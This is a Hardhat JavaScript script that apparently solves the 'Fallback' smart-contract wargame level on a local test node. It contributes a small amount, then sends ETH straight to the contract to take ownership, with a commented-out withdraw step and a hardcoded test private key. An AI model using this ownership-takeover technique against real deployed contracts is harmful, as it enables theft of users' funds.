const { ethers } = require("hardhat");

async function main () {
  const vicmabi = [
    "constructor()",
    "function contribute() public payable",
    "function getContribution() public view returns (uint256)"
    //"function withdraw() public onlyOwner"
  ];

  const [deployer] = await ethers.getSigners();
  const contract = await ethers.getContractFactory("Fallback");
  const deploycontract = await contract.deploy();
  const provider = new ethers.JsonRpcProvider("http://localhost:8545");
  const mywallet = new ethers.Wallet("0x689af8efa8c651a91ad287602527f3af2fe9f6501a7ac4b061667b5a93e037fd", provider);
  const address = deploycontract.target;
  const abicontract = new ethers.Contract(address, vicmabi, mywallet);

  console.log("Contract deployed at:  ", address);

  const ownerAddress = await deploycontract.owner();

  console.log("Before contract owner address: ", ownerAddress);

  const nonce = await provider.getTransactionCount(mywallet.address);
  const nextNonce = nonce + 1;
  const eth = ethers.parseEther("0.0009");
  let contribute = await abicontract.contribute({value: eth});
  let getContribution = await abicontract.getContribution();
  let contributeTx = await abicontract.contribute({ value: eth, nonce: nextNonce });

  console.log("User contribute ETH :", ethers.formatEther(getContribution));
  console.log("Send contribute transaction hash:", contributeTx.hash);

  await contributeTx.wait();

  const sendTx = await mywallet.sendTransaction({
    to: address,
    value: eth,
    nonce: nextNonce + 1 // Increase nonce for the next transaction
  });

  console.log("Send transaction hash:", sendTx.hash);

  await sendTx.wait();

  const afterownerAddress = await deploycontract.owner();
  console.log("After contract owner address: ", afterownerAddress);
  
  //const getbal = await abicontract.withdraw();


  //console.log(transaction);
  

  //await deploycontract.connect(user).contribute({ value: eth });
  //let contribute = await deploycontract.connect(user).getContribution();
  //let ownercontribute = await deploycontract.getContribution();

  //console.log(ethers.formatEther(contribute));
  //console.log(ethers.formatEther(ownercontribute));

}


main().catch((error) => {
  console.error(error);
  process.exit(1);
})